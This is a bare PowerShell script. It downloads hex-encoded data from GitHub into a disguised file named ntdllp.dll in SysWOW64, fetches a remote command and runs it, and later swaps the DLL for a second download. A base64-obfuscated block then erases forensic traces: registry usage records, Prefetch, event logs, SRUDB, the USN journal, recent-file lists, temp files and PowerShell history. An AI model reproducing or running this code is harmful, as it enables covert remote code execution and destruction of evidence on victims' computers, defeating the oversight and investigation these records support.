Add-Type -AssemblyName System.Windows.Forms
$urlA = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/iwe_history.txt"
$urlB = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/e.txt"
$urlC = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/b.txt"
$filePath = "C:\Windows\SysWOW64\ntdllp.dll"
$clipText = "SteF6b2WrAgu"

function HexToBytes {
    param([string]$hexStr)
    $cleanHex = [regex]::Replace($hexStr, '[^0-9A-Fa-f]', '')
    if ($cleanHex.Length % 2 -ne 0) {
        return $null
    }
    $byteArr = [byte[]]::new($cleanHex.Length / 2)
    for ($i = 0; $i -lt $cleanHex.Length; $i += 2) {
        $byteArr[$i/2] = [convert]::ToByte($cleanHex.Substring($i, 2), 16)
    }
    return $byteArr
}

try {
    $responseA = Invoke-WebRequest -Uri $urlA -UseBasicParsing -TimeoutSec 30
    $hexContent = $responseA.Content
    $bytes = HexToBytes $hexContent
    if ($bytes -ne $null) {
        [IO.File]::WriteAllBytes($filePath, $bytes)
    }
} catch {}

Set-Clipboard $clipText

try {
    $responseB = Invoke-WebRequest -Uri $urlB -UseBasicParsing -TimeoutSec 30
    $cmdToRun = $responseB.Content.Trim()
    if ($cmdToRun) {
        Start-Process cmd -ArgumentList "/c $cmdToRun" -NoNewWindow
    }
} catch {}

do {
    Start-Sleep -Seconds 2
} while (Get-Process -Name "Installer" -ErrorAction SilentlyContinue)

try {
    $responseC = Invoke-WebRequest -Uri $urlC -UseBasicParsing -TimeoutSec 30
    $newHexContent = $responseC.Content
    $newBytes = HexToBytes $newHexContent
    if ($newBytes -ne $null) {
        [IO.File]::WriteAllBytes($filePath, $newBytes)
    }
} catch {}

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JEVycm9yQWN0aW9uUHJlZmVyZW5jZSA9ICdTaWxlbnRseUNvbnRpbnVlJwpjbHMKU2V0LUNsaXBib2FyZCAtVmFsdWUgIiAiCldyaXRlLUhvc3QgIkNsZWFuaW5nIFVwLi4uIgokcGFyZW50UGF0aCA9ICJIS0xNOlxTWVNURU1cQ29udHJvbFNldDAwMVxTZXJ2aWNlc1xiYW1cU3RhdGVcVXNlclNldHRpbmdzIgokdGFyZ2V0U0lEcyA9IEdldC1DaGlsZEl0ZW0gLVBhdGggJHBhcmVudFBhdGgKJG91dHB1dEZpbGUgPSAiQzpcU0lELnR4dCIKJHRhcmdldFNJRHMgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAiSEtFWV9MT0NBTF9NQUNISU5FXFNZU1RFTVxDb250cm9sU2V0MDAxXFNlcnZpY2VzXGJhbVxTdGF0ZVxVc2VyU2V0dGluZ3NcJCgkXy5QU0NoaWxkTmFtZSkgWzEgMTddIiB8IE91dC1GaWxlIC1GaWxlUGF0aCAkb3V0cHV0RmlsZSAtQXBwZW5kCn0KcmVnaW5pICJDOlxTSUQudHh0IgpSZW1vdmUtSXRlbSAiQzpcU0lELnR4dCIgLVJlY3Vyc2UgLUZvcmNlCmNtZCAvYyAiZm9yIC9mICIidG9rZW5zPSoiIiAlYSBpbiAoJ3JlZyBxdWVyeSAiIkhLRVlfTE9DQUxfTUFDSElORVxTWVNURU1cQ29udHJvbFNldDAwMVxTZXJ2aWNlc1xiYW1cU3RhdGVcVXNlclNldHRpbmdzIiInKSBkbyBpZiBub3QgIiIlYSIiPT0iIkhLRVlfTE9DQUxfTUFDSElORVxTWVNURU1cQ29udHJvbFNldDAwMVxTZXJ2aWNlc1xiYW1cU3RhdGVcVXNlclNldHRpbmdzIiIgKHJlZyBkZWxldGUgIiIlYSIiIC9mKSIgKj4gJG51bGwKcmVnIGRlbGV0ZSAiSEtDUlxMb2NhbCBTZXR0aW5nc1xTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xTaGVsbCIgL2YgKj4gJG51bGwKcmVnIGRlbGV0ZSAiSEtDVVxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxFeHBsb3JlclxDb21EbGczMiIgL2YgKj4gJG51bGwKcmVnIGRlbGV0ZSAiSEtDVVxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxFeHBsb3JlclxSZWNlbnREb2NzIiAvZiAqPiAkbnVsbApyZWcgZGVsZXRlICJIS0NVXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXEV4cGxvcmVyXFVzZXJBc3Npc3QiIC9mICo+ICRudWxsCnJlZyBkZWxldGUgIkhLQ1VcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cRXhwbG9yZXJcUnVuTVJVIiAvZiAqPiAkbnVsbApyZWcgZGVsZXRlICJIS0NVXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzIE5UXEN1cnJlbnRWZXJzaW9uXEFwcENvbXBhdEZsYWdzXENvbXBhdGliaWxpdHkgQXNzaXN0YW50XFN0b3JlIiAvZiAqPiAkbnVsbApyZWcgZGVsZXRlICJIS0NVXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXEV4cGxvcmVyXEZlYXR1cmVVc2FnZSIgL2YgKj4gJG51bGwKdGFza2tpbGwgL2YgL2ltIGV4cGxvcmVyLmV4ZSAqPiAkbnVsbApuZXQgc3RvcCBFdmVudExvZyAveSAqPiAkbnVsbApSZW1vdmUtSXRlbSAiQzpcV2luZG93c1xQcmVmZXRjaFwqLnBmIiAtRm9yY2UgLVJlY3Vyc2UKUmVtb3ZlLUl0ZW0gIkM6XFdpbmRvd3NcU3lzdGVtMzJcd2luZXZ0XExvZ3NcKi5ldnR4IiAtRm9yY2UgLVJlY3Vyc2UKUmVtb3ZlLUl0ZW0gIkM6XFdpbmRvd3NcYXBwY29tcGF0XHBjYVwqLnR4dCIgLUZvcmNlIC1SZWN1cnNlClJlbW92ZS1JdGVtICJDOlxXaW5kb3dzXFN5c3RlbTMyXHNydVxTUlVEQi5kYXQiIC1Gb3JjZSAtUmVjdXJzZQpSZW1vdmUtSXRlbSAiQzpcUHJvZ3JhbURhdGFcTlZJRElBIENvcnBvcmF0aW9uXERyc1xudkFwcFRpbWVzdGFtcHMiIC1Gb3JjZSAtUmVjdXJzZQpSZW1vdmUtSXRlbSAiJGVudjpBcHBEYXRhXE1pY3Jvc29mdFxXaW5kb3dzXFJlY2VudFwqLmxuayIgLUZvcmNlIC1SZWN1cnNlClJlbW92ZS1JdGVtICIkZW52OkFwcERhdGFcTWljcm9zb2Z0XFdpbmRvd3NcUmVjZW50XEN1c3RvbURlc3RpbmF0aW9uc1wqbXMiIC1Gb3JjZSAtUmVjdXJzZQpSZW1vdmUtSXRlbSAiJGVudjpBcHBEYXRhXE1pY3Jvc29mdFxXaW5kb3dzXFJlY2VudFxBdXRvbWF0aWNEZXN0aW5hdGlvbnNcKm1zIiAtRm9yY2UgLVJlY3Vyc2UKUmVtb3ZlLUl0ZW0gIiRlbnY6QXBwRGF0YVxNaWNyb3NvZnRcV2luZG93c1xQb3dlclNoZWxsXFBTUmVhZExpbmVcKi50eHQiIC1Gb3JjZSAtUmVjdXJzZQpSZW1vdmUtSXRlbSAiJGVudjp0ZW1wXCoiIC1Gb3JjZSAtUmVjdXJzZQpSdW5kbGwzMi5leGUgYXBwaGVscC5kbGwsU2hpbUZsdXNoQ2FjaGUKJGRyaXZlcyA9IEdldC1XbWlPYmplY3QgV2luMzJfTG9naWNhbERpc2sgfCBXaGVyZS1PYmplY3QgeyAkXy5Ecml2ZVR5cGUgLWVxIDMgfQpmb3JlYWNoICgkZHJpdmUgaW4gJGRyaXZlcykgewogICAgJGRyaXZlTGV0dGVyID0gJGRyaXZlLkRldmljZUlECiAgICBmc3V0aWwgdXNuIGRlbGV0ZUpvdXJuYWwgL2QgJGRyaXZlTGV0dGVyICo+ICRudWxsCn0KU3RhcnQtUHJvY2VzcyBleHBsb3Jlci5leGUgKj4gJG51bGwKbmV0IHN0YXJ0IEV2ZW50TG9nIC95ICo+ICRudWxsCmV4aXQ="))) #secret

$historyFilePath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
Clear-Content -Path $historyFilePath -ErrorAction SilentlyContinue
Clear-History -ErrorAction SilentlyContinue
exit
